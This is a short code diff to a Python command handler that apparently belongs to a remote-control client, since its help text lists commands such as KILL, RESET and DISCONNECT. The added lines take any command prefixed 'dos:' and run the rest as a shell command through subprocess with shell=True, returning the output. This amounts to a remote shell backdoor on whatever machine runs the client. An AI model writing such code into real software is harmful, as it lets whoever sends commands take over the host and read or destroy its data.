@@ -38,6 +38,11 @@ def cmd(cmd):
     - KILL
     - RESET
     - DISCONNECT""")
+        if cmd[0:4].lower() == 'dos:':
+            x = cmd.split(":",1)[1]
+            out = subprocess.Popen(x, encoding='utf-8', stdout=subprocess.PIPE, shell=True,)
+            output = out.stdout.read()
+            return output
     except:
         pass
 
